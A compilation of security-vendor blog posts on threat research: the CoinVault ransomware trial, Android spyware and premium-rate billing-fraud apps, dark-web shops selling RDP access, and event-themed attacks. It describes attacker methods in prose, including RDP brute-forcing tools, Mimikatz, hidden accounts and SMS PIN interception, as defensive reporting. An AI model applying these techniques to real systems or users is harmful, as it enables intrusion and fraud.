Fileless malware takes advantage of the trust factor between security software and genuine, signed Windows applications. Because this type of attack is launched through reputable, trusted executables, these attacks are hard to detect. McAfee Endpoint Security (ENS) and Host Intrusion Prevention System (HIPS) customers are protected from this class of fileless attack through Signature ID 6118.
:\/:
How often do we get a chance to learn what goes on in the minds of cybercriminals? Two members of McAfee’s Advanced Threat Research team recently did, as they attended a court case against two cybercriminal brothers.
:\/:
The brothers, Dennis and Melvin, faced a judge in Rotterdam, in the Netherlands. This case was one of the first in the world in which ransomware developers appeared in court and were convicted for creating and spreading ransomware.
:\/:
. CoinVault, the better known of the two, made its appearance in late 2014. The technically skilled programmers had examined the source code of CryptoLocker, the notorious ransomware family that first struck in 2013. The brothers were not very impressed and agreed that they could do a better job. What might have started out as a fun technical challenge turned into a criminal business.
:\/:
The CoinVault and BitCryptor campaigns were not as widespread as CTB-Locker, CryptoWall, or Locky ransomware campaigns. Nor did they profit as much from it, but this case is nevertheless uncommon. It is rare that the developers of ransomware are caught, let alone confess their crimes. This case gives us an opportunity to understand what drove them down a path to cybercrime.
:\/:
Why would someone write malicious code and infect thousands of people? The judge asked the brothers the same question. Their response was “Because it was a technical challenge.” “But didn’t you realize you were dealing with people?” the judge responded. Both brothers answered that they did not; they were dealing with computers and never met their victims face to face.
:\/:
The judge and prosecutor did not accept their explanation. CoinVault had a built-in helpdesk function to directly communicate with their victims, thus registering their pleas. The brothers standard reaction was merciless: “Just pay the money; otherwise we won’t decrypt.” According to the prosecutor, they had plenty of opportunities to see the consequences of their actions but choose to ignore them for money.
:\/:
At the trial they said they were sorry and tearfully regretted what they had done. But were these mere crocodile tears because they got caught? During CoinVault’s lifespan, several versions of the ransomware were released. Every new version was a reaction to blogs written by security researchers and takedowns performed by law enforcement. Instead of realizing that they were making a mistake and stopping, the brothers saw it as a challenge, a digital game of cat and mouse, and constantly improved their malicious code.
:\/:
Their continuing to improve the ransomware shows a lack of empathy with their victims. Was there no one in their social surroundings who could straighten their moral compasses and talk sense into them?
:\/:
A ransomware criminal must decide the amount of ransom to charge. Generally the more targeted a ransomware attack is, the higher the ransom demand will be. CoinVault’s infections were not targeted at one organization; they charged only US$250. The two brothers explained that they chose that price to be low enough for an average person to pay while still making a good profit. The prosecutor remarked ironically that they were “very noble [to keep] their ransom demand affordable.”
:\/:
The two brothers did not directly infect their victims with ransomware; they took a multistep approach. Their distribution method was via newsgroup channels. They hooked a small piece of malicious code to known software or license-key generators before posting the software packages on the newsgroups. Once victims installed the package or ran the key generator, they would become part of a botnet through the software the brothers named Comhost, which can record keystrokes, search for credentials, and steal Bitcoin wallets. Comhost can also upload and execute binaries received from the control server they named Sonar. (We believe Sonar is modified a version of the popular Solar botnet software.)
:\/:
Once they had accumulated enough bots, they simply pushed CoinVault to all their victims and locked thousands of computers at once. This method made it hard for victims to figure out how they were attacked, because weeks could pass between the initial infection and the encryption. By spreading their ransomware via newsgroups with pirated software, they discouraged victims from going to the police out of fear of prosecution and copyright-violation fines.
:\/:
In April 2015, The National High Tech Crime Unit of the Dutch Police seized the control servers for CoinVault. After the police investigated, the two brothers, aged 18 and 22 at the time, were arrested in Amersfoort, Netherlands, on September 14, 2015. Systems were infected not only in the Netherlands, but also in the United States, Germany, France, and the United Kingdom. Their mistakes? Using flawless Dutch in the ransom notes and one time they did not use a Tor connection to log in into their control server, instead using their home connection.
:\/:
Although they used an obfuscator tool (Confuser) for their code, in some of the samples the full name of one of the authors was present, because they did not clean up the debugging path.
:\/:
During the investigation the Dutch police obtained all the decryption keys for CoinVault and partnered with the private sector to build a decryption tool for CoinVault ransomware, successfully mitigating a large portion of the damage caused by CoinVault. This effort idea gave birth to 
:\/:
 an online portal supported by the public and private sector with the largest repository on the planet of free ransomware decryption tools. No More Ransom now has decryptors for 85 ransomware versions. This global initiative has prevented millions of dollars from falling into the hands of cybercriminals. McAfee is proud to be one of the founding members of No More Ransom.
:\/:
Extorting people with ransomware is wrong, and perpetrators must be held accountable. It is sad to see two talented young people choose a pathway to cybercrime and waste their skills—skills sorely needed in the cybersecurity sector. We hope they will have learned a lesson as they endure the consequences of their actions. The sentencing will take place in about two weeks. Perhaps after they serve their time, they will find someone willing to give them a second chance.
:\/:
English soccer fans have enthusiastically enjoyed the team’s current run in the World Cup, as the tune 
:\/:
 plays in their heads, while hoping to end 52 years of hurt. Meanwhile a recent spyware campaign distributed on Google Play has hurt fans of the beautiful game for some time. Using major events as social engineering is nothing new, as phishing emails have often taken advantage of disasters and sporting events to lure victims.
:\/:
“Golden Cup” is the malicious app that installs spyware on victims’ devices. It was distributed via Google Play, and “offered” the opportunity to stream games and search for records from the current and past World Cups. McAfee Mobile Security identifies this threat as Android/FoulGoal.A; Google has removed the malicious applications from Google Play.
:\/:
Once Golden Cup is installed it appears to be a typical sporting app, with multimedia content and general information about the event. Most of this data comes from a web service without malicious activity. However, in the background and without user consent the app silently transfers information to another server.
:\/:
This spyware may be just the first stage of a greater infection due to its capability to load dex files from remote sources. The app connects to its control server and tries to download, unzip, and decrypt a second stage.
:\/:
Android/FoulGoal.A detects when the screen is on or off and records this in its internal file scrn.txt, with the strings “on” or “off” to track when users are looking at their screens:
:\/:
The Message Queuing Telemetry Transport protocol serves as the communication channel between the device and the malicious server to send and receive commands.
:\/:
User data is encrypted with AES before it is sent to the control server. Cryptor class provides the encryption and decryption functionality. The doCrypto function is defined as a common function. As the first parameter of the function, “1” represents encryption and “2” is decryption mode:
:\/:
The encryption key is generated dynamically using the SecureRandom function, which generates a unique value on the device to obfuscate the data. The addKey function embeds the encryption key into the encryption data. The data with the key is uploaded to the control server.
:\/:
We believe the malware author uses this AES encryption technique for any information to be uploaded to escape the detection by Google Bouncer and network inspection products.
:\/:
Our initial analysis suggests there were at least 300 infections, which we suspect occurred between June 8‒12, before the first World Cup matches began.
:\/:
The second phase of the attack leverages an encrypted dex file. The file has a .data extension and is downloaded and dynamically loaded by the first-stage malware; it is extracted with the same mechanism used to upload the encrypted files. The location of the decryption key can be identified from the size of the contents and a fixed number in the first-stage malware.
:\/:
After decryption, we can see out.dex in zipped format. The dex file has spy functions to steal SMS messages, contacts, multimedia files, and device location from infected devices.
:\/:
The control server in second stage is different from the first stage’s. The encryption methodology and the server folder structures on the remote server are identical to the first stage.
:\/:
We found one victim’s GPS location information and recorded audio files (.3gp) among the encrypted data on the control server.
:\/:
We have also discovered two other variants of this threat created by the same authors and published to Google Play as dating apps. Although all the apps have been removed from Google Play, we still see indications of infections from our telemetry data, so we know these apps are active on some users’ devices.
:\/:
Our telemetry data indicates that although users around the world have downloaded the app, the majority of downloads took place in the Middle East, most likely as a result of a World Cup–themed Twitter post in Hebrew directing people to download the app for a breakdown of the latest events.
:\/:
McAfee Mobile Security users are protected against all the variants of this threat, detected as   Android/FoulGoal.A.
:\/:
While researching underground hacker marketplaces, the McAfee Advanced Threat Research team has discovered that access linked to security and building automation systems of a major international airport could be bought for only US$10.
:\/:
The dark web contains RDP shops, online platforms selling remote desktop protocol (RDP) access to hacked machines, from which one can buy logins to computer systems to potentially cripple cities and bring down major companies.
:\/:
RDP, a proprietary protocol developed by Microsoft that allows a user to access another computer through a graphical interface, is a powerful tool for systems administrators. In the wrong hands, RDP can be used to devastating effect. The recent SamSam ransomware attacks on several American institutions demonstrate how RDP access serves as an entry point. Attacking a high-value network can be as easy and cheap as going underground and making a simple purchase. Cybercriminals like the SamSam group only have to spend an initial $10 dollars to get access and are charging $40K ransom for decryption, not a bad return on investment.
:\/:
A screenshot of Blackpass.bz, one of the most popular RDP-shops, largely due to the variety of services offered.
:\/:
 “Really Dumb Passwords” in 2013. That short phrase encapsulates the vulnerability of RDP systems. Attackers simply scan the Internet for systems that accept RDP connections and launch a brute-force attack with popular tools such as, Hydra, NLBrute or RDP Forcer to gain access. These tools combine password dictionaries with the vast number of credentials stolen in recent large data breaches. Five years later, RDP shops are even larger and easier to access.
:\/:
The McAfee Advanced Threat Research team looked at several RDP shops, ranging in size from 15 to more than 40,000 RDP connections for sale at Ultimate Anonymity Service (UAS), a Russian business and the largest active shop we researched. We also looked at smaller shops found through forum searches and chats. During the course of our research we noticed that the size of the bigger shops varies from day to day with about 10%. The goal of our research was not to create a definitive list of RDP shops; rather, we sought a better understanding of the general modus operandi, products offered, and potential victims.
:\/:
The number of compromised systems claimed to be available for sale by several RDP shops. A single compromised system can appear on more than one shop’s list.
:\/:
How do cybercriminals (mis)use RDP access? RDP was designed to be an efficient way to access a network. By leveraging RDP, an attacker need not create a sophisticated phishing campaign, invest in malware obfuscation, use an exploit kit, or worry about antimalware defenses. Once attackers gain access, they are in the system. Scouring the criminal underground, we found the top uses of hacked RDP machines promoted by RDP shops.
:\/:
Using RDP access to create misdirection is one of the most common applications. While preserving anonymity, an attacker can make it appear as if his illegal activity originates from the victim’s machine, effectively planting a false flag for investigators and security researchers. Attackers can plant this flag by compiling malicious code on the victim’s machine, purposely creating false debugging paths and changing compiler environment traces.
:\/:
Just as spammers use giant botnets such as Necrus and Kelihos, RDP access is popular among a subset of spammers. Some of the systems we found for sale are actively promoted for mass-mailing campaigns, and almost all the shops offer a free blacklist check, to see if the systems were flagged by SpamHaus and other antispam organizations.
:\/:
 By accessing a system via RDP, attackers can obtain almost all data stored on a system. This information can be used for identity theft, account takeovers, credit card fraud, and extortion, etc.
:\/:
 we wrote about the increase in illegal cryptocurrency mining due to the rising market value of digital currencies. We found several criminal forums actively advertising Monero mining as a use for compromised RDP machines.
:\/:
The large majority of ransomware is still spread by phishing emails and exploit kits. However, specialized criminal groups such as SamSam are known to use RDP to easily enter their victims’ networks almost undetected.
:\/:
 The advertised systems ranged from Windows XP through Windows 10. Windows 2008 and 2012 Server were the most abundant systems, with around 11,000 and 6,500, respectively, for sale. Prices ranged from around US $3 for a simple configuration to $19 for a high-bandwidth system that offered access with administrator rights.
:\/:
 When comparing “stock” among several RDP shops, we found that the same RDP machines were sold at different shops, indicating that these shops act as resellers.
:\/:
 Windows Embedded Standard, now called Windows IOT, is used in a wide variety of systems that require a small footprint. These systems can range from thin clients to hotel kiosk systems, announcement boards, point-of-sale (POS) systems, and even parking meters among others.
:\/:
Among the thousands of RDP-access systems offered, some configurations stood out. We found hundreds of identically configured Windows Embedded Standard machines for sale at UAS Shop and BlackPass; all these machines were in the Netherlands. This configuration was equipped with a 1-GHz VIA Eden processor. An open-source search of this configuration revealed that it is most commonly used in thin clients and some POS systems. The configurations are associated with several municipalities, housing associations, and health care institutions in the Netherlands.
:\/:
Thin client and POS systems are often overlooked and not commonly updated, making them an ideal backdoor target for an attacker. Although these systems have a small physical footprint, the business impact of having such a system compromised should not be underestimated. As we’ve observed from previous breaching of retailers leveraging unpatched or vulnerable POS systems, the damage extends far beyond financial only, including customer perception and long-term brand reputation.  In regard to the current affected systems we discovered, McAfee has notified the identified victims and is working to learn further detail on why and how these identical Windows systems were compromised.
:\/:
 We also came across multiple government systems being sold worldwide, including those linked to the United States, and dozens of connections linked to health care institutions, from hospitals and nursing homes to suppliers of medical equipment. In 
:\/:
 the Advanced Threat Research team showed the possible consequences of ill-secured medical data and what can happen when an attacker gains access to medical systems. It is very troublesome to see that RDP shops offer an easy way in.
:\/:
In addition to selling RDP, some of these shops offer a lively trade in social security numbers, credit card data, and logins to online shops. The second-largest RDP shop we researched, BlackPass, offered the widest variety of products. The most prolific of these brokers provide one-stop access to all the tools used to commit fraud: RDP access into computers, social security numbers and other integral data to set up loans or open bank accounts.
:\/:
For legal and ethical reasons, we did not purchase any of the products offered. Therefore, we cannot determine the quality of the services.
:\/:
Is it possible to find a high-value victim using an RDP shop? The Advanced Threat Research team put this theory to the test. By leveraging the vast amounts of connections offered by the RDP shops, we were able to quickly identify a victim that fits the profile of a high-value target in the United States.
:\/:
We found a newly posted (on April 16) Windows Server 2008 R2 Standard machine on the UAS Shop. According to the shop details, it belonged to a city in the United States and for a mere $10 we could get administrator rights to this system.
:\/:
UAS Shop hides the last two octets the of the IP addresses of the systems it offers for sale and charges a small fee for the complete address. (We did not pay for any services offered by UAS or any other shop.) To locate the system being sold, we used 
:\/:
The results were far more alarming than we anticipated. The Shodan search narrowed 65,536 possible IPs to just three that matched our query. By obtaining a complete IP address we could now look up the WHOIS information, which revealed that all the addresses belonged to a major International airport. This is definitely not something you want to discover on a Russian underground RDP shop, but the story gets worse.
:\/:
A closer look at the screenshots shows that the Windows configuration (preceding screen) is identical to the system offered in the RDP shop. There are three user accounts available on this system, one of which is the administrator account. The names of the other accounts seemed unimportant at first but after performing several open-source searches we found that the accounts were associated with two companies specializing in airport security; one in security and building automation, the other in camera surveillance and video analytics. We did not explore the full level of access of these accounts, but a compromise could offer a great foothold and lateral movement through the network using tools such as Mimikatz.
:\/:
Looking at the other login account (preceding screen), we saw it is part of the domain with a very specific abbreviation. We performed the same kind of search on the other login account and found the domain is most likely associated with the airport’s automated transit system, the passenger transport system that connects terminals. It is troublesome that a system with such significant public impact might be openly accessible from the Internet.
:\/:
Now we know that attackers, like the SamSam group, can indeed use an RDP shop to gain access to a potential high-value ransomware victim. We found that access to a system associated with a major international airport can be bought for only $10—with no zero-day exploit, elaborate phishing campaign, or watering hole attack.
:\/:
To publish our findings, we have anonymized the data to prevent any disclosure of sensitive security information.
:\/:
Besides selling countless connections, RDP shops offer tips on how to remain undetected when an attacker wants to use the freshly bought RDP access.
:\/:
This screen from the UAS Shop’s FAQ section explains how to add several registry keys to hide user accounts.
:\/:
The UAS Shop offers a zip file with a patch to allow multiuser RDP access, although it is not possible by default on some Windows versions. The zip file contains two .reg files that alter the Windows registry and a patch file that alters termsvrl.dll to allow concurrent remote desktop connections.
:\/:
These alterations to the registry and files leave obvious traces on a system. Those indicators can be helpful when investigating misuse of RDP access.
:\/:
In addition to checking for these signs, it is good practice to check the Windows event and security logs for unusual logon types and RDP use. The following screen, from the well-known SANS Digital Forensics and Incident Response poster, explains where the logs can be found.
:\/:
Outside access to a network can be necessary, but it always comes with risk. We have summarized some basic RDP security measures:
:\/:
Using complex passwords and two-factor authentication will make brute-force RDP attacks harder to succeed
:\/:
Enumerate all systems on the network and list how they are connected and through which protocols. This also applies for Internet of Things and POS systems.
:\/:
Remotely accessing systems is essential for system administrators to perform their duties. Yet they must take the time to set up remote access in a way that is secure and not easily exploitable. RPD shops are stockpiling addresses of vulnerable machines and have reduced the effort of selecting victims by hackers to a simple online purchase.
:\/:
Governments and organizations spend billions of dollars every year to secure the computer systems we trust. But even a state-of-the-art solution cannot provide security when the backdoor is left open or carries only a simple padlock. Just as we check the doors and windows when we leave our homes, organizations must regularly check which services are accessible from the outside and how they are secured. Protecting systems requires an integrated approach of defense in depth and proactive attitudes from every employee.
:\/:
Every four years, everyone’s head around the globe turns toward the television. The Olympics, the World Cup – world events like these have all eyes viewing friendly competition between nations. Operating under such a big spotlight, these events have been heavily guarded by physical security to ensure no participants or attendees are harmed. But what about digital security? In 2018, many aspects of these events have become digitized, which is great for event organizers and viewers, but also for cybercriminals. In fact, reports are already circulating that hackers are targeting attendees of this year’s 
:\/:
The cultural value placed in these international games is precisely the reason cybercriminals target them. The more something is valued, the more people are willing to make sacrifices for it. Cybercriminals know that, and hope to capitalize on it.
:\/:
In cases like the World Cup, fans may be willing to expose themselves to a more hostile environment in order to feel a part of the event. The same goes for companies that are associated with the sporting events, as they can fall victims to attacks just as individuals do.
:\/:
Both innocent tourists and fans at home may have to deal with threats that result from their involvement in these events. Given the fact that internet access has increased all over the world, many tourists are vulnerable to rogue access-point attacks in public places. Attackers can use these points to harvest credentials and gain access to a victim’s device and accounts. Malware can also be placed within ATM machines, ready to rip off tourists withdrawing currency from their banks. As for fans at home, many phishing and waterhole attacks have been designed around these events to entice fans to visit malicious sites or open emails that appear to be related to the games.
:\/:
However, for nation-state attacks, a lot of groundwork is done before these global events even begin. Our McAfee Labs team 
:\/:
 in the period leading up to the Pyeongchang 2018 Olympic Winter Games. A nation-state hacker pretended to be a supplier to the Olympics and sent out weaponized mail to organizations of interest that contained malware developed well before the event had started.
:\/:
Whether the objective behind the threat is disruption or financial gain, these attacks all do have one thing in common — they impact the overall feeling of safety at these events and take away from what is supposed to feel like a worldwide celebration of sport.
:\/:
Now, when fans wish to part of a big event such as the World Cup, they can no longer just focus on which jersey they’re wearing that day. They have to worry about their bank accounts being robbed or becoming extorted. Beyond the individual implications, the nation-state attacks that take place at these events can rear their head in an ugly way, as they can actually worsen international relations much more than a healthy sporting rivalry ever could.
:\/:
So the question is – now what? On an individual level, visitors to these events must maintain overall good digital security hygiene. This means leaving unnecessary devices at home, enabling two-factor authentication, using a VPN service, and overall remaining alert and vigilant for scams.
:\/:
Beyond that, we must all recognize that our physical and digital lives are converging at a fast pace, and we now have a large digital attack surface that is not yet properly safeguarded. And with both cybercriminals and nation-state actors showing such a heightened interest in global cultural events, cybersecurity must become an essential part of organizing such an event. Only then can countries host a successful and safe sporting event for everyone.

Are you tired yet of the music track “Despacito”? If you downloaded this ringtone app from Google Play, chances are your answer is a resounding Yes. But it gets worse: The McAfee Mobile Research team recently found 15 apps on Google Play that were uploaded by the AsiaHitGroup Gang. The ringtone app was one of them—downloaded 50,000 times from the official app store—that were designed to steal money from their victims. The AsiaHitGroup Gang has been active since at least 2016, attempting to charge 20,000 victims for the download of popular mobile applications containing the fake-installer app Sonvpay.A. For more analysis, see the 
:\/:
Ordinarily we advise users to review the requested permissions before installing a mobile app, and normally this is enough. In this case, the only permission requested was access to SMS messages, and once installed the app behaved as expected. In the background, however, Sonvpay silently used the push notification service to subscribe users to premium-rate services.
:\/:
This campaign displays a significant level of customization. The criminals can tailor their fraud to the country of their choosing. In our analysis we looked at mobile billing fraud targeting users in Kazakhstan, Malaysia, and Russia. In Kazakhstan victims are subscribed to a premium-rate service whereas in Malaysia and Russia they are connected to a WAP billing service. Further, the criminals recognize that in Malaysia the mobile operator sends a PIN code, so the attackers include functionality to intercept the SMS. Once intercepted, the app communicates with the mobile operator to subscribe to the service.
:\/:
This group began targeting users in Asia, but the move to Russia shows its increasing ambition. The goal of the AsiaHitGroup Gang remains the same, but the manner in which they attempt to achieve their ends differs per campaign, and their techniques are improving. Although the security industry focuses much attention on “loud” and destructive attacks, many campaigns quietly steal funds from unsuspecting victims or those who have little visibility into what is happening.
:\/:
The McAfee Mobile Research team has found a new billing-fraud campaign of at least 15 apps published in 2018 on Google Play. Toll fraud (which includes 
:\/:
 This new campaign demonstrates that cybercriminals keep finding new ways to steal money from victims using apps on official stores such as Google Play.
:\/:
The AsiaHitGroup Gang has been active since at least late 2016 with the distribution of the fake-installer applications Sonvpay.A, which attempted to charge at least 20,000 victims from primarily Thailand and Malaysia for the download of copies of popular applications. One year later, in November 2017, a new campaign was 
:\/:
, Sonvpay.B, used IP address geolocation to confirm the country of the victim and added Russian victims to the WAP billing fraud to increase its potential to steal money from unsuspected users.
:\/:
In January 2018, the AsiaHitGroup Gang returned to Google Play with the repackaged app, Sonvpay.C, which uses silent background push notifications to trigger a fake update dialog. When victims start the “update” they instead subscribe to a premium-rate service. The subscription operates primarily via WAP billing, which does not require sending SMS messages to premium-rate numbers. Instead it requires only that users employ the mobile network to access a specific website and automatically click on a button to initiate the subscription process. Based on the approximate number of installations from Google Play, the cost of the premium-service subscription, and the days that these apps were available, we estimate that the AsiaHitGroup Gang could have potentially earned between $60,500–$145,000 since January.
:\/:
The McAfee Mobile Research team initially found the following applications repackaged with Sonvpay on Google Play, all of them published this year:
:\/:
We notified Google about these apps on April 10 and they were promptly removed. A couple of days later the app “Despacito for Ringtone” was found again on the store and was quickly removed. In total we found 15 apps that were installed at least 50,000 times since the first one, Cut Ringtones 2018, was released on Google Play in January 2018. The following table lists the 15 malicious apps:
:\/:
At the time of download, the only red flag that a user could notice is that the app needs access to SMS messages. Once installed and executed, the app behaves as expected (QR code reader, ring tones, etc.). However, in the background and without the user’s knowledge, Sonvpay listens for incoming push notifications that contain the data to perform mobile billing fraud.
:\/:
Sonvpay employs the onesignal push notification service to get the information to subscribe users to premium-rate services. To receive the data in the background without displaying a notification, Sonvpay implements the method “onNotificationProcessing” and returns “true” to make the notification silent:
:\/:
The received data can perform WAP and SMS fraud along with information necessary to display a fake update notification to the user after some time of using the repackaged application. This fake notification has only one bogus button. If the user scrolls until the end, the misleading phrase “Click Skip is to agree” appears:
:\/:
If the user clicks the only button, Sonvpay will do its job. However, even if there is no interaction with this window and the data in the push notification has the value “price” as empty, Sonvpay will proceed to subscribe to a premium-rate service:
:\/:
One of the parameters obtained from the silent push notification is a URL to request the location of functionality to perform mobile billing fraud. Once the fake update notification is displayed, Sonvpay requests the download of the library from another remote server:
:\/:
The new APK file is downloaded and stored in the path /sdcard/Android/<package_name>/cache/ so that it can be dynamically loaded and executed at runtime. The library we obtained for performing mobile billing fraud targeted only Kazakhstan and Malaysia but, because the library is present in a remote server and can be dynamically loaded, it can likely be updated at any time to target more countries or mobile operators.
:\/:
In the case of Kazakhstan, Sonvpay loads a specific URL delivered through the silent push notification and uses JavaScript to click on a button and on the element “activate” to fraudulently subscribe the user to a premium-rate service:
:\/:
For Malaysia, the malware creates a new WebView to send the “Shortcode” and “Keyword” parameters to a specific URL to subscribe the user to a WAP billing service:
:\/:
However, for Malaysia the app needs to intercept a confirmation code (PIN) sent by the mobile operator via SMS. Sonvpay has this SMS interception functionality implemented in the original repackaged application:
:\/:
Once the PIN is obtained, it is sent to the mobile operator via a web request to automatically confirm the subscription. If the parameters for Kazakhstan or Malaysia do not match, Sonvpay still tries to perform mobile billing fraud by attempting to send an SMS message to a premium-rate number provided via the silent push notification:
:\/:
While looking for patterns in the 2018 campaign, we found the app DJ Mixer–Music Mixer. As soon as this application executes, it checks if the device has an Internet connection. If the device is offline, the app shows the error message “You connect to internet to continue” and ends its execution. If the device is online, the app executes a web request to a specific URL:
:\/:
We learned the apps created by the developer SHINY Team 2017 were available on Google Play in September 2017; earlier Sonvpay variants 
:\/:
 in November 2017. The primary behavior of the two variants is almost the same—including the changing of the main icon and the app’s name to Download Manager to hide its presence from the user. However, with DJ Mixer, the geolocation of the IP address identifies the country of the infected device and aids the execution of the mobile billing fraud:
:\/:
In this case only three countries are targeted via the geolocation service: Russia (RU), Thailand (TH), and Malaysia (MY). If the IP address of the infected devices is not from any of these countries, a dialog will claim the app is not active and that the user needs to uninstall and update to the latest version.
:\/:
If the country is Thailand or Malaysia, the malicious app randomly selects a keyword to select an image to offer users premium-rate services. With Malaysia the image includes English text with terms of service and the button “Subscribe” to accept the randomly selected premium-rate service:
:\/:
In the case of Thailand, the text is in Thai and includes a small version of terms of service along with instructions to unsubscribe and stop the charges:
:\/:
Finally, with Russia no image is shown to the user. The app fraudulently charges the user via WAP billing while enabling 3G and disabling Wi-Fi:
:\/:
We also found similar apps from late 2016 that performed SMS fraud by pretending to be legitimate popular applications and asking the user to pay for them. These are similar to text seen in the 2018 campaign as an update but labeled as Term of user:
:\/:
If the user clicks “No,” the app executes as expected. However, if the user clicks “Yes,” the app subscribes the user to a premium-rate service by sending an SMS message with a specific keyword to a short number. Next the mobile operator sends the device a PIN via SMS; the malware intercepts the PIN and returns it via web request to confirm the subscription.
:\/:
Once the user is fraudulently subscribed to a premium-rate service to download a copy of a free app on official app stores, the malware shows the dialog “Downloading game…” and proceeds with the download of another APK stored on a third-party server. Although the APK file that we downloaded from the remote server is a copy of the legitimate popular app, the file can be changed at any point to deliver additional malware.
:\/:
Unlike in previous campaigns, we did not find evidence that these fake-installer apps were distributed via Google Play. We believe that they were distributed via fake third-party markets from which users looking for popular apps are tricked into downloading APK files from unknown sources.  In June 2018 ESET and Sophos found a new version of this variant pretending to be the popular game Fortnite. The fake game was distributed via a YouTube video by asking the user to download the fake app from a specific URL. This recent campaign shows that the cybercriminals behind this threat are still active tricking users into installing these fake applications.
:\/:
All of these campaigns rely on billing-fraud apps targeting users in Southeast and Central Asia and offer some similarities in behavior such as the use of almost the same text and images to trick users into subscribing to premium-rate services. Other potential connections among the three campaigns suggest that all the apps are likely from the same actor group. For example, apps from all campaigns use the same string as debug log tag:
:\/:
There is also a notable similarity in package and classes names and in the use of a common framework (telpoo.frame) to perform typical tasks such as database, networking, and interface support:
:\/:
Finally, apps from the Google Play campaigns use the domain vilandsoft[.]com to check for updates. The same domain is also used by apps from the fake-installer campaign to deliver remote-execution commands, for example, action_sendsms:
:\/:
The following timeline identifies the campaigns we have found from this group, strategies to trick users into installing the apps, distribution methods, main payload, and targeted countries:
:\/:
Sonvpay campaigns are one example of how cybercriminals like the AsiaHitGroup Gang constantly adapt their tactics to trick users into subscribing to premium-rate services and boosting their profits. The campaigns started in late 2016 with very simple fake installers that charged users for copies of popular apps. In late 2017, Google Play apps abused WAP-billing services and used IP address geolocation to target specific countries. In 2018, Google Play apps used silent background push notifications to trigger the display of a fake update message and to gather data for mobile billing fraud. We expect that cybercriminals will continue to develop and distribute new billing fraud campaigns to target more countries and affect more users around the world.
:\/:
Cybercriminals always follow the money, and one of the most effective ways to steal money from users is via billing fraud. A victim will likely not notice a fraudulent charge, for example, until it appears on the mobile bill at the end of the month. Even when the payment is detected early, most of the time the charge is for a subscription rather than a one-time payment. Thus victims will need to find a way to unsubscribe from the premium-rate service, which may not be easy if the subscription occurred silently or if the app does not provide that information. Also, the fact that WAP-billing fraud does not require sending an SMS message to a premium-rate number makes it easier to commit. Cybercriminals need to only silently subscribe users by forcing them to load the WAP-billing service page and click on buttons. For these reasons we expect that mobile billing fraud will continue to target Android users.
:\/:
McAfee Mobile Security detects this threat as Android/Sonvpay. To protect yourselves from this and similar threats, employ security software on your mobile devices, check user reviews for apps on Google Play, and do not accept or trust apps that ask for payment functionality via SMS messages as soon as the app is opened or without any interaction.
:\/:
 published today, we share investigative research and threat statistics gathered by the McAfee Advanced Threat Research and McAfee Labs teams in Q1 of this year. We have observed that although overall new malware has declined by 31% since the previous quarter, bad actors are working relentlessly to develop new technologies and tactics that evade many security defenses.
:\/:
Deeper investigations reveal that the attack targeting organizations involved in the Pyeongchang Winter Olympics in South Korea used not just one PowerShell implant script, but multiple implants, including Gold Dragon, which established persistence to engage in reconnaissance and enable continued data exfiltration.
:\/:
The infamous global cybercrime ring known as Lazarus has resurfaced. We discovered that the group has launched the Bitcoin-stealing phishing campaign “HaoBao,” which targets the financial sector and Bitcoin users.
:\/:
We are also seeing the emergence of a complex, multisector campaign dubbed Operation GhostSecret, which uses many data-gathering implants. We expect to see an escalation of these attacks in the near future.
:\/:
 New ransomware attacks took a significant dive (-32%), largely as a result of an 81% drop in Android lockscreen malware.
:\/:
 Attackers targeting cryptocurrencies may be moving from ransomware to coin miner malware, which hijacks systems to mine for cryptocurrencies and increase their profits. New coin miner malware jumped an astronomical 1,189% in Q1.
:\/:
 Cybercriminals are increasingly using LNK shortcuts to surreptitiously deliver malware. New PowerShell malware dropped 77% in Q1, while attacks leveraging Microsoft Windows LNK shortcut files jumped 24%.
:\/:
 Overall security incidents rose 41% in Q1, with incidents hitting multiple regions showing the biggest increase, at 67%, and the Americas showing the next largest increase, at 40%.
:\/:
Time flies when you’re fighting cybercrime. Now that’s not exactly how the phrase goes, but for us at McAfee, it’s hard to believe that we’re already almost halfway through 2018. It seems like just yesterday we were predicting the types of cyberthreats we would see throughout this year with our 
:\/:
. From the machine learning arms race to the home becoming the ultimate storefront, it looked like we had a quite a year ahead of us. But in reality, not all these predictions can to fruition. And conversely, some unraveled in ways we didn’t imagine. Let’s take a look at what predictions became reality, and what may still lay ahead for the cybersecurity industry in 2018.
:\/:
In November of last year, we predicted 2018 was going to be colored by ransomware attacks that were anything but ordinary. These attacks could pivot away from traditional, individual extortion, and rather aim to sabotage or disrupt organizations.
:\/:
Ransomware attacks have seen a pivot, last year we witnessed the WannaCry ransomware attacks, which spread like wildfire to hundreds of thousands of devices, but this year’s ransomware attacks have reshaped their focus, completely moving away from the individual attack. With disruption as an objective, these attacks managed to shut down both critical and personal services. As of June 2018, an 
:\/:
 have all been victims of a ransomware attack, proving threat actors will stop at almost nothing in order to cause a bit of chaos.
:\/:
Late last year, our Labs team discussed how the influence of machine learning will be felt on both sides of the equation – white hats will ramp up their AI/ML defenses, while cybercriminals will tap into the technology’s power to enact advanced attacks. With machines working for anyone, an arms race would be fueled, and machine-supported actions would increase from both defenders and attackers.
:\/:
 fairly successful at applying AI to malware detection and user and entity behavior analytics (UEBA) by using deep neural networks and anomaly detection. In fact, the use of this technology and application of human-machine teaming has been 
:\/:
 as a reason top talent will accept a job at a cybersecurity firm in the first place. However, we have yet to see them actively leveraged by cybercriminals in attacks this year.
:\/:
In lieu of AI, attacks in 2018 have rather used more traditional techniques, but for non-traditional purposes. Just take 
:\/:
 as an example – the attacked leveraged malicious documents, which is typically known as an older attack vector, but set its sights on a unique type of target: humanitarian aid groups. Honeybee also ladders back to a larger trend seen throughout the first half of this year – threats have new targets, and certainly new objectives.
:\/:
The growth of smart home devices is nothing new, but the way they’re leveraged by corporations has changed over time. We predicted 2018 to be no exception, companies creating these devices have powerful incentives to observe what consumers are doing in their homes and learn from their behaviors. We foresaw these corporations exploring new ways to capture consumer data and adjusting terms and conditions in order to avoid getting fined.
:\/:
 and use of consumer data have been huge topics of discussion in 2018, but not because of the IoT industry yet. Rather, the now infamous 
:\/:
 incident stirred up quite the debate earlier this year around what companies are doing with consumer data.
:\/:
In 2018, IoT devices are being used to spy – but not by corporations. Cybercriminals are continuing to use vulnerable IoT devices to their advantage, swooping data and spying on families as a result of device vulnerabilities. From 
:\/:
, the handful of IoT attacks in 2018 have proved that these devices still have ways to go when it comes to a solid security posture.
:\/:
Cybercriminals will take advantage of convenient opportunities as they arise, which is precisely why our team predicted that threat actors will jump on serverless apps this year, using their greater granularity as a chance to increase the attack surface and steal data in transit across a network.
:\/:
